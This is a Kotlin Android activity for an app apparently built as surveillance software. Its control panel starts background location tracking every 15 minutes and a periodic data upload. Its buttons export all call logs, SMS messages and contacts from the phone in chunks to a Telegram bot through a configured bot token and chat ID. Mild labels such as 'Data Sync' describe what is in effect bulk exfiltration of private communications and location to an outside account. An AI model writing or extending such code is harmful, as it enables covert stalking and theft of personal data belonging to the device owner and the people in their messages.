// MainActivity.kt
package com.example.lta

import android.Manifest
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.material3.Divider
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.work.*
import com.example.lta.ui.theme.LtaTheme
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit

class MainActivity : ComponentActivity() {

    private lateinit var permissionManager: PermissionManager
    private lateinit var manualDataManager: ManualDataManager
    private lateinit var telegramBotApi: TelegramBotApi
    private lateinit var workManager: WorkManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        permissionManager = PermissionManager(this)
        manualDataManager = ManualDataManager(applicationContext)
        telegramBotApi = TelegramBotApi(
            applicationContext.getString(R.string.telegram_bot_token),
            applicationContext.getString(R.string.telegram_chat_id)
        )
        workManager = WorkManager.getInstance(applicationContext)

        setContent {
            LtaTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    ControlPanelScreen(
                        modifier = Modifier.padding(innerPadding),
                        permissionManager = permissionManager,
                        manualDataManager = manualDataManager,
                        telegramBotApi = telegramBotApi,
                        workManager = workManager
                    )
                }
            }
        }
    }
}

@Composable
fun ControlPanelScreen(
    modifier: Modifier = Modifier,
    permissionManager: PermissionManager,
    manualDataManager: ManualDataManager,
    telegramBotApi: TelegramBotApi,
    workManager: WorkManager
) {
    val context = LocalContext.current
    val coroutineScope = rememberCoroutineScope()
    var statusMessage by remember { mutableStateOf("Ready.") }

    Column(
        modifier = modifier
            .fillMaxSize()
            .padding(16.dp)
            .verticalScroll(rememberScrollState()),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text("Status: $statusMessage", fontWeight = FontWeight.Bold)
        Spacer(modifier = Modifier.height(16.dp))
        SectionHeader(title = "Background Workers")
        Button(onClick = {
            permissionManager.requestPermission(Manifest.permission.ACCESS_FINE_LOCATION) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    permissionManager.requestPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) {
                        schedulePeriodicLocationWorker(workManager)
                        statusMessage = "Periodic location tracking started."
                        Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
                    }
                } else {
                    schedulePeriodicLocationWorker(workManager)
                    statusMessage = "Periodic location tracking started."
                    Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
                }
            }
        }) {
            Text("Start Periodic Location (15 min)")
        }
        Spacer(modifier = Modifier.height(8.dp))
        Button(onClick = {
            workManager.cancelUniqueWork(LocationWorker.UNIQUE_WORK_NAME)
            statusMessage = "Periodic location tracking stopped."
            Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
        }) {
            Text("Stop Periodic Location")
        }
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = {
            scheduleDataUploadWorker(workManager)
            statusMessage = "Periodic data/system sync started."
            Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
        }) {
            Text("Start Periodic Data Sync (15 min)")
        }
        Spacer(modifier = Modifier.height(8.dp))
        Button(onClick = {
            workManager.cancelUniqueWork("DataUploadWorker")
            statusMessage = "Periodic data sync stopped."
            Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
        }) {
            Text("Stop Periodic Data Sync")
        }
        SectionHeader(title = "Manual Actions")
        Button(onClick = {
            statusMessage = "Requesting one-time location..."
            permissionManager.requestPermission(Manifest.permission.ACCESS_FINE_LOCATION) {
                val oneTimeWorkRequest = OneTimeWorkRequestBuilder<LocationWorker>()
                    .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
                    .build()
                workManager.enqueue(oneTimeWorkRequest)
                statusMessage = "One-time location request enqueued."
                Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
            }
        }) {
            Text("Send Location Now")
        }
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = {
            permissionManager.requestPermission(Manifest.permission.READ_CALL_LOG) {
                statusMessage = "Exporting all call logs..."
                coroutineScope.launch {
                    val callLogs = manualDataManager.getCallLogs()
                    sendDataInChunks(callLogs, "Call Logs", telegramBotApi)
                    statusMessage = "${callLogs.size} call logs sent."
                }
            }
        }) {
            Text("Export All Call Logs")
        }
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = {
            permissionManager.requestPermission(Manifest.permission.READ_SMS) {
                statusMessage = "Exporting all SMS..."
                coroutineScope.launch {
                    val smsList = manualDataManager.getSmsMessages()
                    sendDataInChunks(smsList, "SMS Messages", telegramBotApi)
                    statusMessage = "${smsList.size} SMS messages sent."
                }
            }
        }) {
            Text("Export All SMS")
        }
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = {
            permissionManager.requestPermission(Manifest.permission.READ_CONTACTS) {
                statusMessage = "Exporting all contacts..."
                coroutineScope.launch {
                    val contacts = manualDataManager.getContacts()
                    sendDataInChunks(contacts, "Contacts", telegramBotApi)
                    statusMessage = "${contacts.size} contacts sent."
                }
            }
        }) {
            Text("Export All Contacts")
        }
    }
}

@Composable
private fun SectionHeader(title: String) {
    Spacer(modifier = Modifier.height(16.dp))
    Divider()
    Spacer(modifier = Modifier.height(16.dp))
    Text(title, fontSize = 18.sp, fontWeight = FontWeight.Bold)
    Spacer(modifier = Modifier.height(16.dp))
}

private fun schedulePeriodicLocationWorker(workManager: WorkManager) {
    val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
    val periodicWorkRequest = PeriodicWorkRequestBuilder<LocationWorker>(15, TimeUnit.MINUTES)
        .setConstraints(constraints).build()
    workManager.enqueueUniquePeriodicWork(
        LocationWorker.UNIQUE_WORK_NAME, ExistingPeriodicWorkPolicy.KEEP, periodicWorkRequest
    )
}

private fun scheduleDataUploadWorker(workManager: WorkManager) {
    val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
    val periodicWorkRequest = PeriodicWorkRequestBuilder<DataUploadWorker>(15, TimeUnit.MINUTES)
        .setConstraints(constraints).build()
    workManager.enqueueUniquePeriodicWork(
        "DataUploadWorker", ExistingPeriodicWorkPolicy.KEEP, periodicWorkRequest
    )
}

fun PermissionManager.requestPermission(permission: String, onGranted: () -> Unit) {
    this.requestPermission(permission, onGranted) { }
}

// FIXED: This function now needs to be a suspend function because it calls one.
private suspend fun sendDataInChunks(data: List<String>, title: String, api: TelegramBotApi) {
    if (data.isEmpty()) {
        api.sendMessage("$title: No data found.")
        return
    }
    val chunkSize = 20
    data.chunked(chunkSize).forEachIndexed { index, chunk ->
        val messageBuilder = StringBuilder()
        messageBuilder.append("--- $title (Part ${index + 1}) ---\n\n")
        chunk.forEach { item ->
            messageBuilder.append(item).append("\n")
        }
        api.sendMessage(messageBuilder.toString())
    }
}
